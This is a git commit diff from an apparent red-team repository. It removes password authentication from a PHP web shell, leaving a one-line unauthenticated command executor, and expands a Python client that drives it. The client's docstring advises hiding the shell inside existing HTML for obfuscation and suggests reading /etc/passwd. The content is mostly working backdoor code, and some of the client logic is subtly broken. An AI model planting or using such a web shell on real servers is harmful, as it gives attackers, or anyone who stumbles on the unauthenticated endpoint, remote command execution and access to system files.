48262b83e079ae95b3e391bbb207aff42deb30dc
Russell Harvey <39575139+rdh1896@users.noreply.github.com>
2020-09-17 16:45:04 -0400

    Removed Auth
    Authentication only threw errors. A simple one liner in the php achieves the intended purpose. Since we are on red team, they only people we could be concerned about interacting with the script outside of blue team is ourselves. This means given the situation, authentication is not necessary.

--- shell.php
+++ shell.php
@@ -1,24 +1,3 @@
-define('PASSWORD', '4df1e18b9159dd3482014710ed9b13fc');
-
-function authorization($password)
-{
-	$password_hash = md5($password);
-
-	if (strcmp(PASSWORD, $password_hash) == 0) {
-		return TRUE;
-	} else {
-		return FALSE;
-	}
-}
-
-
-if (isset($_GET['cmd']) && !empty($_GET['cmd']) && isset($_GET['password'])) {
-
-	if (auth($_GET['password'])) {
-			echo '<pre>'. exec($_GET['cmd']) .'<pre>';
-	} else {
-		die('Access Denied!');
-	}
-}
-
+<?php
+echo '<pre>'. exec($_GET['cmd']) .'<pre>';
 ?>
--- shell_client.py
+++ shell_client.py
@@ -1,3 +1,22 @@
+"""
+Name: Russell Harvey
+File: shell_client.py
+
+For usage with "shell.php". In order to properly send commands,
+you must have "shell.php" placed in /var/www/html of an Apache server.
+From there you can execute this "shell_client.php" script to issue commands
+to the Apache server. The shell.php file can be renamed or better yet nested
+inside of already existing HTML code for further obfuscation.
+
+Usage:
+    1. Run the script using "python3 shell_client.py"
+    2. Enter just the IP address/URL of the server (Do not include prefixes or suffixes)
+    3. Press enter for HTTP, or enter 1 if the server is running HTTPS.
+    4. You can now enter commands as if you were logged in as the Apache user! Try
+    commands such as "whoami" or "cat /etc/passwd".
+"""
+
+
 # password = D@ve'sMag!cBall$
 
 import requests
@@ -6,17 +25,24 @@ from bs4 import BeautifulSoup
 
 
 def init():
+    """
+    Creates a URL to the target server.
+    :return: string
+    """
     target = input("Enter Target IP Address (must have shell.php loaded): ")
     ssl = input("HTTP (0 or press enter) or HTTPS (1): ")
     if ssl == 1:
         target = "https://" + target + "/shell.php"
     else:
         target = "http://" + target + "/shell.php"
-    password = "D@ve'sMag!cBall$"
-    return target, password
+    return target
 
 
 def main():
+    """
+    Main function for shell_client.php. Refer to header for usage.
+    :return: None
+    """
     data = init()
     print("Establishing Web Shell with server %s" % data[0])
     while True:
@@ -24,7 +50,7 @@ def main():
         if cmd == "exit":
             sys.exit(1)
         try:
-            r = requests.get(data[0], params={'cmd': cmd, 'password': data[1]})
+            r = requests.get(data, params={'cmd': cmd})
             output = BeautifulSoup(r.text, 'html.parser')
             print(output.pre.text)
         except requests.exceptions.RequestException as e:
